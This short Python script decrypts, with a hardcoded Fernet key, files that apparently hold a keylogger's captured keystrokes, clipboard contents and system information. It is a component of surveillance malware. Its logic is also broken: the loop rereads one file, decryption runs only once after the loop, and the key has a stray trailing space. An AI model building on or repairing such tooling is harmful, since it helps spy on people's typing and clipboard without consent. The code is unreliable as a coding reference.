from cryptography.fernet import Fernet

key = "7Sb8NlR8pVF4GcLnbV8Wv-ZYKSPHdKTs5-jbDw9_mks= "

system_information_e = "e_system.txt"
clipboard_info_e = "e_clipboard.txt"
keys_information_e = "e_keys_logged.txt"

encrypted_files = [system_information_e, clipboard_info_e, keys_information_e]
count = 0 

for decrypting_file in encrypted_files:
    with open(encrypted_files[count], 'rb') as f:
        data = f.read()


fernet = Fernet(key)
decrypted = fernet.decrypt(data)

with open(encrypted_files[count], "wb" ) as f:
    f.write(decrypted)

count+= 1